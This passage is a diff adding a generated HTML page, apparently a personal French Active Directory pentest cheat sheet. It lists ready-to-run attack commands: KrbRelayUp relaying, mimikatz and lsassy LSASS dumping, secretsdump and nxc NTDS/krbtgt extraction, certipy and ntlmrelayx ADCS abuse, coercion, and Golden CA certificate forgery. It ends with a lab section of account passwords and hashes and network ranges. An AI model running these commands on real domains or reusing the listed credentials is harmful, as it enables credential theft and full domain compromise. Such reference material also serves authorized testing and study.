+</code></pre><h2 id="krbrelayup">KrbRelayUp</h2>
+<pre tabindex="0"><code>.\KrbRelayUp.exe relay -Domain klemou.corp -CreateNewComputerAccount -Computer evil$ -ComputerPassword evil123
+.\KrbRelayUp.exe spawn -m rbcd -d klemou.corp -dc DC02.klemou.corp -cn KRBRELAYUP$ -cp evil123
+</code></pre><h2 id="dump-lsass">Dump Lsass</h2>
+<h3 id="windows-7">Windows</h3>
+<pre tabindex="0"><code>privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+</code></pre><h3 id="linux-6">Linux</h3>
+<pre tabindex="0"><code>nxc smb mssql.klemou.corp -u crz -p &#39;992e71f059.585a7ffa20&#39; -M lsassy
+</code></pre><h2 id="dump-ntds">Dump NTDS</h2>
+<h3 id="windows-8">Windows</h3>
+<pre tabindex="0"><code>mimikatz #TODO
+</code></pre><h3 id="linux-7">Linux</h3>
+<pre tabindex="0"><code>secretsdump.py DAuser:password@dc.domain.local -just-dc-user krbtgt
+nxc smb dc01.domain.local -u &#39;DAuser&#39; -p &#39;password&#39; --ntds --user krbtgt
+</code></pre><h2 id="adcs">ADCS</h2>
+<h3 id="info-sur-adcs">Info sur ADCS</h3>
+<pre tabindex="0"><code>nxc ldap dc.domain.local -u &#39;user&#39; -p &#39;password&#39; -M adcs
+</code></pre><h3 id="création-de-certificats">création de certificats</h3>
+<pre tabindex="0"><code>certipy req  -ca &#39;caName&#39; -u &#39;user&#39; -p &#39;password&#39; -target-ip adcs.klemou.corp
+</code></pre><h3 id="demande-de-tgt-avec-un-certificat">Demande de TGT avec un certificat</h3>
+<pre tabindex="0"><code>gettgtpkinit.py -cert-pfx cert.pfx -dc-ip dc.domain.local domain.local/user tgt.ccache
+</code></pre><h3 id="récupération-du-hash-via-un-tgt">Récupération du hash via un tgt</h3>
+<pre tabindex="0"><code>getnthash.py -k key  -dc-ip dc.domain.local domain.local/user
+</code></pre><h3 id="relai-sur-le-web-enrollement-de-ladcs">Relai sur le web enrollement de l&rsquo;ADCS</h3>
+<pre tabindex="0"><code>ntlmrelayx.py -t &#34;http://adcs.domain.local/certsrv/certfnsh.asp&#34; -smb2support --adcs
+ntlmrelayx.py -t &#34;http://srv.klemou.corp/certsrv/certfnsh.asp&#34; -smb2support --adcs --template DomainController # pour les DC
+</code></pre><h3 id="coerce-de-gros-porc">Coerce de gros porc</h3>
+<pre tabindex="0"><code>coercer  coerce -l ipAttaquant -d domain.local -u user -p pass -t dc.domain.local
+</code></pre><h3 id="golden-ca">Golden Ca</h3>
+<pre tabindex="0"><code>Export ca in ADDS panel 
+openssl pkcs12 -in EXAMPLE-CA.p12 -out ca.pem
+openssl pkcs12 -in ca.pem -keyex -CSP &#34;Microsoft Enhanced Cryptographic Provider v1.0&#34; -export -out cert.pfx
+</code></pre><pre tabindex="0"><code>certipy forge -ca-pfx ca.pfx -upn &#34;user@domain&#34; -subject &#39;CN=user,OU=Users,DC=DOMAIN,DC=TLD&#39; -crl http://adcs.domain.tld/CertEnroll/
+</code></pre><h1 id="lab">Lab</h1>
+<h2 id="ad"><strong>AD</strong></h2>
+<pre tabindex="0"><code>Administrator : fe63693e9e.2e90861a9c
+antoine       : 099bd3d1c39.c22d1a464
+crz           : 992e71f059.585a7ffa20
+glpi_cnx      : a9285936fb.3dfdf6a889
+ws_klemou     : Qwertyuiop123!
+sql_svc       : 515aa2db9.749107818e6
+hugo          : e0eec4062.cbc38dd8f38
+sql_mngt      : 5486a9646.1b307dcf720
+ndes          : f77c171f50.001b01ade5
+adcs_adm      : b2a1349450.64025f1b0e
+
+Local Adm     : 4eaf07215.645eb0e68f6
+</code></pre><h2 id="srv-standelone">Srv standelone</h2>
+<pre tabindex="0"><code>klemou        : 634daa6f9.4519be0b91c  #CC978D063970FC60FD9DA830D160A229
+sql_user      : ee3f628e3b.14501b0b8f
+sa            : MssqlPasswordFTW123!   # compte local a sql
+
+user1         : Esna123$
+.               .
+.               .
+.               .
+user30        : Esna123$
+</code></pre><h2 id="plage">plage</h2>
+<pre tabindex="0"><code>10.10.10.10-20    # serveur du domaine
+10.10.10.20-30    # machine utilisateur du domaine
+10.10.10.50-80    # serveur standelone 
+10.10.10.150-250  # pc perso
+</code></pre>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2024 Kleman.
+        
+    </small>
+</footer>
+
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
